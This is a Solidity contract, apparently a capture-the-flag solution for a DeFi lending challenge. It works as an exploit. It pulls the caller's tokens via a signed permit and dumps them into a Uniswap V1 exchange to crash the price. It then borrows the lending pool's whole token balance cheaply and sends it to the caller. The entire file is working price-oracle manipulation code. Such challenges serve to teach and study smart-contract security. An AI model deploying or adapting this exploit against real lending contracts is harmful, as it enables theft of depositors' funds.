// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";

interface IUniswapExchangeV1 {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract PuppetAttacker {
    constructor(address uniswapPair, address lendingPool, address token, uint8 v, bytes32 r, bytes32 s) payable {
        // We use the permit to approve the contract to spend msg.sender tokens
        IERC20Permit(token).permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);

        // Now we can transfer the tokens
        IERC20(token).transferFrom(msg.sender, address(this), IERC20(token).balanceOf(msg.sender));

        // Manipulate the price of the token
        IERC20(token).approve(uniswapPair, type(uint256).max);
        IUniswapExchangeV1(uniswapPair).tokenToEthSwapInput(
            IERC20(token).balanceOf(address(this)), 1, uint256(block.timestamp + 1)
        );

        // We can now borrow all the tokens and direct them to player wallet
        IPool(lendingPool).borrow{value: address(this).balance}(IERC20(token).balanceOf(lendingPool), msg.sender);

        // Optionnal: send back remaining ETH to msg.sender
        msg.sender.call{value: address(this).balance}("");
    }
}
